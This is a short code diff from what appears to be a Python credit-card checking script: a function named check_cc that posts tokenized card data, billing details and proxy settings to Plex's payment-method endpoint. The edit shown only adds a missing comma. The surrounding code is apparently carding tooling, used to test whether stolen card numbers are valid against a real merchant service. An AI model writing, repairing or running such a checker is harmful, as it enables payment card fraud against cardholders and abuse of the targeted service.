@@ -213,7 +213,7 @@ async def check_cc(cc_details):
                 ('payment_method', 'braintree_credit_card'), ('wc-braintree-credit-card-card-type', 'master-card'),
                 ('wc_braintree_credit_card_payment_nonce', tok), ('wc_braintree_device_data', '{"correlation_id":"ca769b8abef6d39b5073a87024953791"}'),
                 ('wc-braintree-credit-card-tokenize-payment-method', 'true'), ('woocommerce-add-payment-method-nonce', add_nonce),
-                ('_wp_http_referer', '/en-GB/payments/add/'), ('woocommerce_add_payment_method', '1')
+                ('_wp_http_referer', '/en-GB/payments/add/'), ('woocommerce_add_payment_method', '1'),
                 ('billing_country', 'US'), ('postal_code', '10002')
             ]
             async with session.post('https://account.plex.tv/en-GB/payments/add/', headers=headers, data=data, proxy=proxies['http'] if proxies else None) as response:
